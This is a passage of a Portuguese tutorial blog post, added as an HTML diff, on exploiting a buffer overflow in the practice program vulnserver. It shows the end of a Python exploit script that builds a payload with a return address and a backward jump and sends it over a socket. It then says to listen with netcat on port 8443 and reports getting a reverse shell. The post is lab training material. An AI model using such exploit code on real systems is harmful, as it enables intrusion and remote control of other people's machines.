+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd3\x11\x50\x62</span><span class="s">"</span> <span class="c1"># endereco de retorno
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe9\x64\xff\xff\xff</span><span class="s">"</span> <span class="c1"># salta para o primeiro buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">309</span> <span class="o">-</span> <span class="mi">147</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="c1"># segundo buffer
+</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Enviando payload..."</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Payload enviado! Cheque o netcat."</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Agora podemos setar o netcat na porta utilizada no shellcode, em nosso caso 8443 iniciar o vulnserver fora do Immunity e rodar nosso script.</p>
+
+<p><img src="/img/std/winbof/winbof-44.png" alt="Enumaração do comando." /></p>
+
+<p>E conseguimos nosso shell reverso.</p>
+
+<p>Nesta vulnerabilidade encontramos um problema de tamanho de buffer para inserir o shellcode, mas conseguimos vencer esta limitação, reutilizando bibliotecas que o programa já utiliza.</p>
+
+<p>Nos próximos comandos, vamos encontrar complexidades diferentes.</p>
+
+<p>Go Go Go !!!</p>
